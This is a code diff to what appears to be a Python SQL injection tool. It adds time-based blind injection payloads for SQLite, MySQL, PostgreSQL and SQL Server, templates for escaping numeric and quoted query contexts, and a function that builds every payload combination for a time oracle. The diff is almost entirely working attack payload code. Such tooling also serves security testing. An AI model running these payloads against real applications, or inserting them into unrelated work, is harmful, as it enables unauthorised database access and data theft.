@@ -55,7 +55,71 @@ def fingerprint(body: str) -> Optional[str]:
     return None
 
 
-# Which time-delay payload form is expected to work per DBMS (for the time oracle).
+# Delay forms per DBMS for the time-based oracle. {d} = delay seconds.
+#   "and"     — an AND-able boolean expression that pauses then evaluates true;
+#               usable inside `WHERE col = <here>` once the boundary is closed.
+#   "stacked" — a standalone statement appended after ';' (needs multi-statement).
+TIME_DELAYS: Dict[str, Dict[str, str]] = {
+    # SQLite has no sleep(); force CPU work with a recursive CTE counter (no blob
+    # size limit, low memory, scales ~1s per 6M iterations → ~{d}s). count(*)
+    # forces full iteration; k>=0 is always true so it reads as a boolean AND.
+    "SQLite":               {"and": "1=(SELECT 1 FROM (WITH RECURSIVE c(x) AS "
+                                     "(SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{d}*6000000) "
+                                     "SELECT count(*) AS k FROM c) WHERE k>=0)"},
+    "MySQL":                {"and": "SLEEP({d})",
+                             "stacked": "SELECT SLEEP({d})"},
+    "PostgreSQL":           {"and": "(SELECT 1 FROM pg_sleep({d}))=1",
+                             "stacked": "SELECT pg_sleep({d})"},
+    "Microsoft SQL Server": {"stacked": "WAITFOR DELAY '0:0:{d}'"},
+}
+
+# Injection boundaries: how to break out of the parameter's SQL context before the
+# delay so it actually executes. Covers numeric and quoted/parenthesised string
+# contexts (e.g. `WHERE name = '<here>'`). {bv}=baseline value, {expr}=delay form.
+TIME_AND_BOUNDARIES = [
+    ("numeric",      "{bv} AND {expr}"),
+    ("single-quote", "{bv}' AND {expr}-- -"),
+    ("double-quote", '{bv}" AND {expr}-- -'),
+    ("paren-single", "{bv}') AND {expr}-- -"),
+    ("paren-numeric", "{bv}) AND {expr}-- -"),
+]
+TIME_STACKED_BOUNDARIES = [
+    ("numeric-stacked",      "{bv}; {expr}-- -"),
+    ("single-quote-stacked", "{bv}'; {expr}-- -"),
+]
+
+
+def time_oracle_payloads(bv: str, d: int, dbms: Optional[str] = None) -> List[tuple]:
+    """Build (label, payload) candidates for the time-based oracle.
+
+    Tries the fingerprinted DBMS first (if known), then the rest, each across every
+    injection boundary so a delay is detected in numeric AND quoted/paren contexts.
+    """
+    order = list(TIME_DELAYS)
+    if dbms in TIME_DELAYS:
+        order = [dbms] + [d_ for d_ in order if d_ != dbms]
+
+    seen, out = set(), []
+    for name in order:
+        forms = TIME_DELAYS[name]
+        if "and" in forms:
+            for blabel, btmpl in TIME_AND_BOUNDARIES:
+                expr = forms["and"].format(d=d)
+                payload = btmpl.format(bv=bv, expr=expr)
+                if payload not in seen:
+                    seen.add(payload)
+                    out.append((f"{name}/{blabel}", payload))
+        if "stacked" in forms:
+            for blabel, btmpl in TIME_STACKED_BOUNDARIES:
+                expr = forms["stacked"].format(d=d)
+                payload = btmpl.format(bv=bv, expr=expr)
+                if payload not in seen:
+                    seen.add(payload)
+                    out.append((f"{name}/{blabel}", payload))
+    return out
+
+
+# Backwards-compatible simple map (numeric boundary) — retained for callers/tests.
 TIME_PAYLOADS = {
     "MySQL":                "{bv} AND SLEEP({d})",
     "PostgreSQL":           "{bv};SELECT pg_sleep({d})-- -",
